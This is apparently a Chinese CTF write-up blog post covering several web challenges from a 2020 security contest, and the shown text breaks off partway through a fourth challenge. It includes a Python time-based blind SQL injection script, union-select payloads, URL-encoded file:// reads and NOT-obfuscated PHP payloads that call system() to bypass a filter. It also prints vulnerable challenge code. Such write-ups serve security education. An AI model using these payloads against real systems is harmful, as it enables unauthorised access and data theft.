@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    第五空间智能安全大赛Web题解 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-第五空间智能安全大赛Web题解" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      第五空间智能安全大赛Web题解
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/" class="article-date">
+  <time datetime="2020-06-24T13:21:07.000Z" itemprop="datePublished">2020-06-24</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p> 第五空间web题目题解</p>
+<a id="more"></a>
+
+<h1 id="0x01-美团外卖"><a href="#0x01-美团外卖" class="headerlink" title="0x01 美团外卖"></a>0x01 美团外卖</h1><p><a href="http://www.zip源码泄露，审计源码，在daochu.php中存在sql注入，" target="_blank" rel="noopener">www.zip源码泄露，审计源码，在daochu.php中存在sql注入，</a></p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624212541399.png" alt="image-20200624212541399"></p>
+<p>可以看到没有任何过滤，该页面不用登录也可以访问这个界面，而且也有回显。由于不知道sms和content表的列数，开始测试没有成功。</p>
+<p>采用时间盲注，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://119.3.183.154/daochu.php?"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((select group_concat(table_NAME) from information_schema.tableS where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(10000000,sha(1)),0)-- -"</span></span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((select group_concat(column_NAME) from information_schema.columnS where table_schema=database() and table_name='admin'),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(10000000,sha(1)),0)-- -"</span></span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((select upass admin where id &gt;0 ),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(10000000,sha(1)),0)-- -"</span></span><br><span class="line">		url_1=url+payload.format(i,mid)</span><br><span class="line">		<span class="keyword">print</span> url_1</span><br><span class="line">		s_time=time.time()</span><br><span class="line">		r=requests.get(url_1,proxies=proxies)</span><br><span class="line">		e_time=time.time()</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> e_time-s_time&gt;<span class="number">1</span>:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag) </span><br><span class="line"></span><br><span class="line"><span class="comment">#admin,content,hint,mac,sms</span></span><br><span class="line"><span class="comment">#id uname upass  hints</span></span><br></pre></td></tr></table></figure>
+
+<p>可以得到hint表中的hints为  see_the_dir_956c110ef9decdd920249f5fed9e4427</p>
+<p>然后访问/956c110ef9decdd920249f5fed9e4427，得到的还是登录的界面</p>
+<p>admin表中</p>
+<p>uname:  admin  </p>
+<p>upass: qweasdzxc  </p>
+<p>好像没有id字段</p>
+<p>但是登录失败，看登录的代码逻辑</p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624223319101.png" alt="image-20200624223319101"></p>
+<p>按代码中的来看，数据库中的upass应该为MD5字符串，这里就应该登不进去了。</p>
+<p>然后继续审计代码，在lib/webuploader/0.1.5/server/preview.php看到了写文件的操作，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 此页面用来协助 IE6/7 预览图片，因为 IE 6/7 不支持 base64</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$DIR = <span class="string">'preview'</span>;</span><br><span class="line"><span class="comment">// Create target dir</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($DIR)) &#123;</span><br><span class="line">    @mkdir($DIR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cleanupTargetDir = <span class="keyword">true</span>; <span class="comment">// Remove old files</span></span><br><span class="line">$maxFileAge = <span class="number">5</span> * <span class="number">3600</span>; <span class="comment">// Temp file age in seconds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cleanupTargetDir) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($DIR) || !$dir = opendir($DIR)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "Failed to open temp directory."&#125;, "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (($file = readdir($dir)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $tmpfilePath = $DIR . DIRECTORY_SEPARATOR . $file;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remove temp file if it is older than the max age and is not the current file</span></span><br><span class="line">        <span class="keyword">if</span> (@filemtime($tmpfilePath) &lt; time() - $maxFileAge) &#123;</span><br><span class="line">            @unlink($tmpfilePath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$src = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"#^data:image/(\w+);base64,(.*)$#"</span>, $src, $matches)) &#123;</span><br><span class="line"></span><br><span class="line">    $previewUrl = sprintf(</span><br><span class="line">        <span class="string">"%s://%s%s"</span>,</span><br><span class="line">        <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTPS'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTPS'</span>] != <span class="string">'off'</span> ? <span class="string">'https'</span> : <span class="string">'http'</span>,</span><br><span class="line">        $_SERVER[<span class="string">'HTTP_HOST'</span>],</span><br><span class="line">        $_SERVER[<span class="string">'REQUEST_URI'</span>]</span><br><span class="line">    );</span><br><span class="line">    $previewUrl = str_replace(<span class="string">"preview.php"</span>, <span class="string">""</span>, $previewUrl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $base64 = $matches[<span class="number">2</span>];</span><br><span class="line">    $type = $matches[<span class="number">1</span>];</span><br><span class="line">   <span class="keyword">if</span> ($type === <span class="string">'jpeg'</span>||$type===<span class="string">'php'</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        <span class="comment">#$type = 'jpg';</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = md5($base64).<span class="string">".$type"</span>;</span><br><span class="line">    $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists($filePath)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $data = base64_decode($base64);</span><br><span class="line">        file_put_contents($filePath, $data);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "un recoginized source"&#125;&#125;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接访问<a href="http://119.3.183.154/lib/webuploader/0.1.5/server/preview.php是404，然后将sql注入出来的956c110ef9decdd920249f5fed9e4427接到后面，" target="_blank" rel="noopener">http://119.3.183.154/lib/webuploader/0.1.5/server/preview.php是404，然后将sql注入出来的956c110ef9decdd920249f5fed9e4427接到后面，</a></p>
+<p><a href="http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/preview.php" target="_blank" rel="noopener">http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/preview.php</a></p>
+<p>可以访问，会将php://input输入的内容写到文件中，格式为data:image/jpg;base64,dfdgassdga（类似这种）</p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224023437.png" alt="image-20200624224023437"></p>
+<p>提示说已经有木马在e98a4571cf72b798077d12d6c94629.php</p>
+<p>然后访问，显示getfile，尝试get传file值，可以得到flag。</p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224201195.png" alt="image-20200624224201195"></p>
+<p>赛后发现可以直接利用回显注出数据。</p>
+<p>首先确定type为2时，sms表的列数。</p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625110000373.png" alt="image-20200625110000373"></p>
+<p>有八列，然后查数据，</p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625110234553.png" alt="image-20200625110234553"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;daochu.php?type&#x3D;1&amp;imei&#x3D;%22%20union%20select%201,2,hints,4,5,hints%20from%20hint--%20-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224404494.png" alt="image-20200624224404494"></p>
+<h1 id="0x02-do-you-know"><a href="#0x02-do-you-know" class="headerlink" title="0x02 do you know"></a>0x02 <strong>do you know</strong></h1><ul>
+<li>非预期：</li>
+</ul>
+<p>从题目逻辑上来看，这题应该是用SSRF+XXE+反序列化，但是</p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224624983.png" alt="image-20200624224624983"></p>
+<p>这里用的是$_SERVER[‘QUERY_STRING’]来获取get输入的值，可以利用url编码绕过，直接利用file协议读文件，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br><span class="line">%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%69%6e%64%65%78%2e%70%68%70</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624225042417.png" alt="image-20200624225042417"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;xxe.php</span><br><span class="line">%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%78%78%65%2e%70%68%70</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624225155654.png" alt="image-20200624225155654"></p>
+<p>依次得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hints.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#there is an main.php</span></span><br><span class="line"><span class="comment">#“大佬，要不咱们用一个好长好长的数字的md5做通信密码吧”</span></span><br><span class="line"><span class="comment">#“那你给我算一个出来”</span></span><br><span class="line"><span class="comment">#“好的”</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#小白打开了win10的calc，开始计算8129947191207+1992100742919</span></span><br><span class="line"><span class="comment">#然后他直接用鼠标复制了结果，计算md5值</span></span><br><span class="line"><span class="comment">#“好了大佬，10122047934126的md5值”</span></span><br><span class="line"><span class="comment">#“6dc6a29df1d7d33166bba5e17e42d2ea对吧”</span></span><br><span class="line"><span class="comment">#“哈？？？不是3e3e7d453061d953bce39ed3e82fd2a1吗”</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#“咱们对一下数字？”</span></span><br><span class="line"><span class="comment">#‭10122047934126‬</span></span><br><span class="line"><span class="comment">#10122047934126</span></span><br><span class="line"><span class="comment">#“这不是一样的吗....咋就md5不一样了.......”</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#找出来到底哪里出了问题，就可以看这道web题目了</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $object;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $variable;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $o = <span class="keyword">$this</span>-&gt;object;</span><br><span class="line">        $m = <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">        $v = <span class="keyword">$this</span>-&gt;variable;</span><br><span class="line">        $o-&gt;$m();</span><br><span class="line">        <span class="keyword">global</span> $$v;</span><br><span class="line">        $answer = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $answer;</span><br><span class="line">        <span class="keyword">echo</span> $answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'‬'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'‬'</span>])-&gt;CaptureTheFlag();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you do not pass the misc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以知道flag在flag.php中，然后读flag.php。</p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224856202.png" alt="image-20200624224856202"></p>
+<h1 id="0x03-hate-php"><a href="#0x03-hate-php" class="headerlink" title="0x03 hate-php"></a>0x03 hate-php</h1><p>题目直接给了源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用取反绕过，开始用的assert(next(getallheaders()))，看网上说改UA就可以执行php代码，测试失败，可以用assert(end(getallheaders()))，end直接取的是Connection，直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)()</span><br><span class="line">phpinfo()</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)((~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))</span><br><span class="line">var_dump(end(getallheaders()))</span><br><span class="line">(~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)())</span><br><span class="line">end(getallheaders())</span><br><span class="line">(~%8C%86%8C%8B%9A%92)((~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))</span><br><span class="line">system(end(getallheaders()))</span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624230617477.png" alt="image-20200624230617477"></p>
+<p>后来看到参数也可以用取反绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//print_r(get_defined_functions()['internal']);</span></span><br><span class="line">$a = <span class="string">"system"</span>; <span class="comment">//%8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$b = <span class="string">"cat /flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$b);</span><br><span class="line"></span><br><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624231048058.png" alt="image-20200624231048058"></p>
+<h1 id="0x04-zzm’s-blog"><a href="#0x04-zzm’s-blog" class="headerlink" title="0x04 zzm’s blog"></a>0x04 <strong>zzm’s blog</strong></h1><p>得到pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span 